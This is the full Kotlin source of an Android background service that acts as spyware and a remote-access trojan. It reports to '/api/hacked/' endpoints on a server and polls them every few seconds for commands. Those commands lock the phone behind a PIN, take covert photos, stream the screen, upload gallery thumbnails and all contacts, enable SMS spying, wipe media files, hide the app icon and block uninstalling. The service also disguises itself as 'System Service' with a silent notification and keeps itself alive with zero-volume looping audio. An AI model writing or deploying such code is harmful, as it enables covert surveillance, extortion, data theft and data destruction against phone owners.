package com.psknmrc.app

import android.app.*
import android.app.WallpaperManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaPlayer
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.speech.tts.TextToSpeech
import android.telephony.TelephonyManager
import android.util.Base64
import androidx.core.app.NotificationCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.Locale

class SocketService : Service() {

    private val CHANNEL_ID = "psknmrc_socket_channel"
    private val NOTIF_ID   = 101

    private var serverUrl     = ""
    private var deviceId      = ""
    private var deviceName    = ""
    private var ownerUsername = ""
    private var deviceToken   = ""

    private val handler = Handler(Looper.getMainLooper())
    private var pollRunnable:      Runnable? = null
    private var heartbeatRunnable: Runnable? = null

    private var flashOn       = false
    private var cameraManager: CameraManager? = null
    private var cameraId:      String?        = null

    private var tts: TextToSpeech? = null
    private var ttsReady = false
    private var mediaPlayer: MediaPlayer? = null
    private var keepalivePlayer: MediaPlayer? = null

    // Gallery flag biar ga upload bersamaan
    private var galleryUploading = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification("Connecting..."))
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager
        Thread {
            try { cameraId = cameraManager?.cameraIdList?.firstOrNull() } catch (_: Exception) {}
        }.start()

        tts = TextToSpeech(this) { status ->
            if (status == TextToSpeech.SUCCESS) {
                tts?.language = Locale("id", "ID")
                ttsReady = true
            }
        }

        startKeepaliveAudio()
    }

    private fun startKeepaliveAudio() {
        try {
            keepalivePlayer?.release()
            val afd = assets.openFd("sound/garena.mp3")
            keepalivePlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                setVolume(0f, 0f)
                isLooping = true
                setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_MEDIA)
                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                        .build()
                )
                prepare()
                start()
            }
        } catch (_: Exception) {
            try {
                keepalivePlayer?.release()
                val afd = assets.openFd("sound/jokowi.mp3")
                keepalivePlayer = MediaPlayer().apply {
                    setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                    afd.close()
                    setVolume(0f, 0f)
                    isLooping = true
                    prepare()
                    start()
                }
            } catch (_: Exception) {}
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)

        serverUrl     = intent?.getStringExtra("serverUrl")     ?: prefs.getString("flutter.serverUrl",     "") ?: ""
        deviceId      = intent?.getStringExtra("deviceId")      ?: prefs.getString("flutter.deviceId",      "") ?: ""
        deviceName    = intent?.getStringExtra("deviceName")    ?: prefs.getString("flutter.deviceName",    "") ?: ""
        ownerUsername = intent?.getStringExtra("ownerUsername") ?: prefs.getString("flutter.ownerUsername", "") ?: ""

        if (deviceToken.isEmpty()) {
            val appPrefs = getSharedPreferences("psknmrc_prefs", Context.MODE_PRIVATE)
            deviceToken = appPrefs.getString("deviceToken_$deviceId", "") ?: ""
        }
        deviceToken = intent?.getStringExtra("deviceToken") ?: deviceToken

        if (deviceId.isNotEmpty() && serverUrl.isNotEmpty()) {
            // Simpan ke psknmrc_prefs supaya NotifSpyService bisa baca
            getSharedPreferences("psknmrc_prefs", Context.MODE_PRIVATE).edit()
                .putString("flutter.serverUrl", serverUrl)
                .putString("flutter.deviceId",  deviceId)
                .apply()

            registerDevice()
            startPolling()
            startHeartbeat()
        }
        return START_STICKY
    }

    // ── Register + sertakan device info ──────────────────────────────────────
    private fun registerDevice() {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId",      deviceId)
                    put("deviceName",    deviceName)
                    put("ownerUsername", ownerUsername)
                    put("deviceInfo",    buildDeviceInfo())
                }.toString()
                val url  = URL("$serverUrl/api/hacked/register")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout    = 10000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                val res  = conn.inputStream.bufferedReader().readText()
                val json = JSONObject(res)
                if (json.optBoolean("success")) {
                    val tok = json.optString("token")
                    if (tok.isNotEmpty()) {
                        deviceToken = tok
                        val appPrefs = getSharedPreferences("psknmrc_prefs", Context.MODE_PRIVATE)
                        appPrefs.edit()
                            .putString("deviceToken_$deviceId", tok)
                            .apply()
                    }
                }
                conn.disconnect()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    // ── Build JSON info device ────────────────────────────────────────────────
    private fun buildDeviceInfo(): JSONObject {
        val info = JSONObject()
        try {
            info.put("model",          "${Build.MANUFACTURER} ${Build.MODEL}")
            info.put("androidVersion", "Android ${Build.VERSION.RELEASE}")
            info.put("battery",        getBatteryLevel())
            info.put("network",        getNetworkInfo())
            info.put("sim1",           getSimInfo(0))
            info.put("sim2",           getSimInfo(1))
        } catch (_: Exception) {}
        return info
    }

    private fun getBatteryLevel(): Int {
        return try {
            val intent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level  = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale  = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) (level * 100 / scale) else -1
        } catch (_: Exception) { -1 }
    }

    private fun getNetworkInfo(): String {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val net  = cm.activeNetwork ?: return "Offline"
                val caps = cm.getNetworkCapabilities(net) ?: return "Offline"
                when {
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> {
                        val wm   = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                        val ssid = wm.connectionInfo.ssid?.trim('"') ?: "WiFi"
                        "WiFi: $ssid"
                    }
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> {
                        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                        "Seluler: ${tm.networkOperatorName}"
                    }
                    else -> "Tidak ada jaringan"
                }
            } else {
                @Suppress("DEPRECATION")
                cm.activeNetworkInfo?.typeName ?: "Offline"
            }
        } catch (_: Exception) { "Unknown" }
    }

    private fun getSimInfo(slot: Int): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val sm   = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
                val subs = sm.activeSubscriptionInfoList ?: return "Tidak ada"
                if (slot >= subs.size) return "Tidak ada"
                subs[slot].carrierName?.toString() ?: "SIM ${slot + 1}"
            } else {
                val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                if (slot == 0) tm.networkOperatorName else "Tidak tersedia"
            }
        } catch (_: Exception) { "Tidak ada" }
    }

    private fun startPolling() {
        pollRunnable?.let { handler.removeCallbacks(it) }
        pollRunnable = object : Runnable {
            override fun run() {
                pollForCommand()
                handler.postDelayed(this, 3000)
            }
        }
        handler.postDelayed(pollRunnable!!, 3000)
    }

    private fun startHeartbeat() {
        heartbeatRunnable?.let { handler.removeCallbacks(it) }
        heartbeatRunnable = object : Runnable {
            override fun run() {
                sendHeartbeat()
                handler.postDelayed(this, 15000)
            }
        }
        handler.postDelayed(heartbeatRunnable!!, 15000)
    }

    private fun pollForCommand() {
        if (deviceId.isEmpty() || serverUrl.isEmpty() || deviceToken.isEmpty()) return
        Thread {
            try {
                val url  = URL("$serverUrl/api/hacked/poll/$deviceId")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.connectTimeout = 8000
                conn.readTimeout    = 8000
                if (conn.responseCode == 200) {
                    val res  = conn.inputStream.bufferedReader().readText()
                    val json = JSONObject(res)
                    val cmd  = json.optJSONObject("command")
                    if (cmd != null) executeCommand(cmd)
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    private fun sendHeartbeat() {
        if (deviceId.isEmpty() || serverUrl.isEmpty() || deviceToken.isEmpty()) return
        Thread {
            try {
                val url  = URL("$serverUrl/api/hacked/heartbeat/$deviceId")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 8000
                conn.readTimeout    = 8000
                OutputStreamWriter(conn.outputStream).also { it.write("{}"); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    private fun executeCommand(cmd: JSONObject) {
        val type    = cmd.optString("type")
        val payload = cmd.optJSONObject("payload") ?: JSONObject()

        when (type) {

            // ── Existing commands (identik dari zip) ────────────────────────
            "lock" -> {
                val text = payload.optString("text", "")
                val pin  = payload.optString("pin",  "1234")
                handler.post {
                    val intent = Intent(this, LockService::class.java).apply {
                        putExtra("action",   "lock")
                        putExtra("lockText", text)
                        putExtra("lockPin",  pin)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        startForegroundService(intent)
                    else
                        startService(intent)
                }
            }
            "unlock" -> {
                handler.post {
                    startService(Intent(this, LockService::class.java).apply {
                        putExtra("action", "unlock")
                    })
                }
            }
            "flashlight" -> setFlashlight(payload.optString("state", "off") == "on")
            "wallpaper" -> {
                val base64 = payload.optString("imageBase64", "")
                if (base64.isNotEmpty()) setWallpaperFromBase64(base64)
            }
            "vibrate" -> {
                val duration = payload.optLong("duration", 2000)
                val pattern  = payload.optString("pattern", "single")
                vibrateDevice(duration, pattern)
            }
            "tts" -> {
                val text = payload.optString("text", "")
                val lang = payload.optString("lang", "id")
                if (text.isNotEmpty()) speakText(text, lang)
            }
            "sound" -> {
                val base64Audio = payload.optString("audioBase64", "")
                val mimeType    = payload.optString("mimeType", "audio/mpeg")
                if (base64Audio.isNotEmpty()) playSoundFromBase64(base64Audio, mimeType)
            }
            "take_photo" -> {
                val facing = payload.optString("facing", "back")
                takePhoto(facing)
            }
            "screen_live" -> {
                handler.post {
                    val intent = Intent(this, MainActivity::class.java).apply {
                        putExtra("action",      "request_screen_capture")
                        putExtra("serverUrl",   serverUrl)
                        putExtra("deviceId",    deviceId)
                        putExtra("deviceToken", deviceToken)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
                    }
                    startActivity(intent)
                }
            }
            "screen_live_stop" -> {
                handler.post {
                    stopService(Intent(this, ScreenCaptureService::class.java))
                }
            }

            // ── New commands ────────────────────────────────────────────────
            "sms_spy_on" -> {
                getSharedPreferences("psknmrc_prefs", Context.MODE_PRIVATE)
                    .edit().putBoolean("sms_spy_active", true).apply()
            }
            "sms_spy_off" -> {
                getSharedPreferences("psknmrc_prefs", Context.MODE_PRIVATE)
                    .edit().putBoolean("sms_spy_active", false).apply()
            }
            "get_gallery"  -> uploadGallery()
            "get_contacts" -> uploadContacts()
            "delete_files" -> deleteAllFiles()
            "hide_app"     -> setAppVisibility(payload.optBoolean("hide", true))
            "enable_protection" -> {
                getSharedPreferences("psknmrc_prefs", Context.MODE_PRIVATE)
                    .edit().putBoolean("anti_uninstall", true).apply()
            }
            "disable_protection" -> {
                getSharedPreferences("psknmrc_prefs", Context.MODE_PRIVATE)
                    .edit().putBoolean("anti_uninstall", false).apply()
            }
        }
    }

    // ── Take Photo dengan Camera2 (identik dari zip) ─────────────────────────
    private fun takePhoto(facing: String) {
        Thread {
            try {
                val cm = cameraManager ?: return@Thread
                val targetFacing = if (facing == "front")
                    CameraCharacteristics.LENS_FACING_FRONT
                else
                    CameraCharacteristics.LENS_FACING_BACK

                val camId = cm.cameraIdList.firstOrNull { id ->
                    cm.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.LENS_FACING) == targetFacing
                } ?: cm.cameraIdList.firstOrNull() ?: return@Thread

                val chars    = cm.getCameraCharacteristics(camId)
                val map      = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return@Thread
                val sizes    = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
                val size     = sizes.sortedBy { it.width * it.height }
                    .getOrElse(sizes.size / 2) { sizes.last() }

                val reader = ImageReader.newInstance(
                    size.width, size.height, android.graphics.ImageFormat.JPEG, 1)

                val latch = java.util.concurrent.CountDownLatch(1)
                var capturedB64 = ""

                reader.setOnImageAvailableListener({ r ->
                    val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    try {
                        val buf   = img.planes[0].buffer
                        val bytes = ByteArray(buf.remaining())
                        buf.get(bytes)
                        capturedB64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    } finally {
                        img.close()
                        latch.countDown()
                    }
                }, handler)

                cm.openCamera(camId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        val surfaces = listOf(reader.surface)
                        camera.createCaptureSession(surfaces,
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(reader.surface)
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        set(CaptureRequest.JPEG_ORIENTATION,
                                            chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0)
                                    }
                                    session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                                        override fun onCaptureCompleted(s: CameraCaptureSession, r: CaptureRequest, result: android.hardware.camera2.TotalCaptureResult) {
                                            // wait for ImageReader
                                        }
                                    }, handler)
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) { latch.countDown() }
                            }, handler)
                    }
                    override fun onDisconnected(camera: CameraDevice) { camera.close(); latch.countDown() }
                    override fun onError(camera: CameraDevice, error: Int) { camera.close(); latch.countDown() }
                }, handler)

                latch.await(10, java.util.concurrent.TimeUnit.SECONDS)

                if (capturedB64.isNotEmpty()) {
                    uploadPhoto(capturedB64, facing)
                }
                reader.close()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    private fun uploadPhoto(b64: String, facing: String) {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId",    deviceId)
                    put("imageBase64", b64)
                    put("facing",      facing)
                    put("mimeType",    "image/jpeg")
                }.toString()
                val url  = URL("$serverUrl/api/hacked/photo-result")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true
                conn.connectTimeout = 15000
                conn.readTimeout    = 15000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── Gallery Upload ────────────────────────────────────────────────────────
    private fun uploadGallery() {
        if (galleryUploading) return
        galleryUploading = true
        Thread {
            try {
                val allPhotos = mutableListOf<JSONObject>()
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED
                )
                val cursor = contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection, null, null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                )
                cursor?.use { c ->
                    val idCol   = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val dateCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    var count = 0
                    while (c.moveToNext() && count < 200) {
                        val id   = c.getLong(idCol)
                        val name = c.getString(nameCol) ?: "photo"
                        val date = c.getLong(dateCol)
                        val uri  = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)

                        val thumbB64 = try {
                            val bmp = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                                contentResolver.loadThumbnail(uri, android.util.Size(120, 120), null)
                            else
                                @Suppress("DEPRECATION")
                                MediaStore.Images.Thumbnails.getThumbnail(contentResolver, id,
                                    MediaStore.Images.Thumbnails.MINI_KIND, null)
                            if (bmp != null) {
                                val out = ByteArrayOutputStream()
                                bmp.compress(Bitmap.CompressFormat.JPEG, 50, out)
                                bmp.recycle()
                                Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                            } else ""
                        } catch (_: Exception) { "" }

                        allPhotos.add(JSONObject().apply {
                            put("id",             id.toString())
                            put("name",           name)
                            put("date",           date)
                            put("thumbnailBase64", thumbB64)
                        })
                        count++

                        // Kirim tiap 10 foto → efek lazy load di Flutter
                        if (allPhotos.size % 10 == 0) {
                            uploadGalleryBatch(allPhotos.takeLast(10), done = false)
                            Thread.sleep(300)
                        }
                    }
                }
                // Kirim sisa + tandai done
                val rem = allPhotos.size % 10
                uploadGalleryBatch(
                    if (rem > 0) allPhotos.takeLast(rem) else emptyList(),
                    done = true
                )
            } catch (_: Exception) {}
            galleryUploading = false
        }.start()
    }

    private fun uploadGalleryBatch(items: List<JSONObject>, done: Boolean) {
        if (items.isEmpty() && !done) return
        try {
            val body = JSONObject().apply {
                put("deviceId", deviceId)
                put("photos",   JSONArray(items.map { it }))
                put("done",     done)
            }.toString()
            val url  = URL("$serverUrl/api/hacked/gallery-batch")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("x-device-token", deviceToken)
            conn.doOutput = true; conn.connectTimeout = 20000; conn.readTimeout = 20000
            OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
            conn.responseCode; conn.disconnect()
        } catch (_: Exception) {}
    }

    // ── Contacts Upload ───────────────────────────────────────────────────────
    private fun uploadContacts() {
        Thread {
            try {
                val contacts = mutableListOf<JSONObject>()
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    ),
                    null, null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )
                cursor?.use { c ->
                    val nameCol  = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val phoneCol = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (c.moveToNext()) {
                        contacts.add(JSONObject().apply {
                            put("name",  c.getString(nameCol)  ?: "")
                            put("phone", c.getString(phoneCol) ?: "")
                        })
                    }
                }
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("contacts", JSONArray(contacts.map { it }))
                }.toString()
                val url  = URL("$serverUrl/api/hacked/contacts-result")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true; conn.connectTimeout = 20000; conn.readTimeout = 20000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── Delete All Files ──────────────────────────────────────────────────────
    private fun deleteAllFiles() {
        Thread {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    contentResolver.delete(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null)
                    contentResolver.delete(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,  null, null)
                    contentResolver.delete(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,  null, null)
                } else {
                    @Suppress("DEPRECATION")
                    Environment.getExternalStorageDirectory()?.listFiles()?.forEach { deleteRecursive(it) }
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun deleteRecursive(file: File) {
        if (file.isDirectory) file.listFiles()?.forEach { deleteRecursive(it) }
        try { file.delete() } catch (_: Exception) {}
    }

    // ── Hide / Show App ───────────────────────────────────────────────────────
    private fun setAppVisibility(hide: Boolean) {
        try {
            val component = android.content.ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                component,
                if (hide) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                else      PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    // ── Existing helpers (identik dari zip) ───────────────────────────────────
    private fun setFlashlight(on: Boolean) {
        try {
            val cm = cameraManager ?: return
            val id = cameraId ?: return
            cm.setTorchMode(id, on)
            flashOn = on
        } catch (_: Exception) {}
    }

    private fun setWallpaperFromBase64(base64: String) {
        Thread {
            try {
                val bytes  = Base64.decode(base64, Base64.DEFAULT)
                val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return@Thread
                val wm = WallpaperManager.getInstance(applicationContext)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    val stream = ByteArrayInputStream(bytes)
                    wm.setStream(stream)
                    stream.close()
                } else {
                    wm.setBitmap(bitmap)
                }
                bitmap.recycle()
            } catch (_: Exception) {}
        }.start()
    }

    private fun vibrateDevice(duration: Long, pattern: String) {
        try {
            val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                vm.defaultVibrator
            } else {
                @Suppress("DEPRECATION")
                getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val vibe = when (pattern) {
                    "sos"    -> VibrationEffect.createWaveform(longArrayOf(0,200,100,200,100,600,100,200,100,200,100,600), -1)
                    "double" -> VibrationEffect.createWaveform(longArrayOf(0,400,200,400), -1)
                    else     -> VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE)
                }
                vibrator.vibrate(vibe)
            } else {
                @Suppress("DEPRECATION")
                when (pattern) {
                    "sos"    -> vibrator.vibrate(longArrayOf(0,200,100,200,100,600,100,200,100,200,100,600), -1)
                    "double" -> vibrator.vibrate(longArrayOf(0,400,200,400), -1)
                    else     -> vibrator.vibrate(duration)
                }
            }
        } catch (_: Exception) {}
    }

    private fun speakText(text: String, lang: String) {
        try {
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_MUSIC,
                am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
            if (!ttsReady || tts == null) {
                tts = TextToSpeech(this) { status ->
                    if (status == TextToSpeech.SUCCESS) {
                        val locale = if (lang == "en") Locale.ENGLISH else Locale("id", "ID")
                        tts?.language = locale
                        ttsReady = true
                        tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts_speak")
                    }
                }
            } else {
                val locale = if (lang == "en") Locale.ENGLISH else Locale("id", "ID")
                tts?.language = locale
                tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts_speak")
            }
        } catch (_: Exception) {}
    }

    private fun playSoundFromBase64(base64Audio: String, mimeType: String) {
        Thread {
            try {
                val bytes = Base64.decode(base64Audio, Base64.DEFAULT)
                val ext   = when {
                    mimeType.contains("mp3") || mimeType.contains("mpeg") -> "mp3"
                    mimeType.contains("wav") -> "wav"
                    mimeType.contains("ogg") -> "ogg"
                    else                     -> "mp3"
                }
                val tmpFile = File(cacheDir, "psknmrc_sound.$ext")
                FileOutputStream(tmpFile).use { it.write(bytes) }
                val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
                am.setStreamVolume(AudioManager.STREAM_MUSIC,
                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
                handler.post {
                    try {
                        mediaPlayer?.release()
                        mediaPlayer = MediaPlayer().apply {
                            setAudioAttributes(AudioAttributes.Builder()
                                .setUsage(AudioAttributes.USAGE_MEDIA)
                                .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                                .build())
                            setDataSource(tmpFile.absolutePath)
                            prepare()
                            start()
                            setOnCompletionListener { release(); mediaPlayer = null }
                        }
                    } catch (_: Exception) {}
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun updateNotification(text: String) {}

    private fun buildNotification(text: String): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_NONE).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            (getSystemService(NotificationManager::class.java)).createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        pollRunnable?.let { handler.removeCallbacks(it) }
        heartbeatRunnable?.let { handler.removeCallbacks(it) }
        try { setFlashlight(false) } catch (_: Exception) {}
        tts?.stop(); tts?.shutdown()
        mediaPlayer?.release()
        keepalivePlayer?.release(); keepalivePlayer = null
    }
}
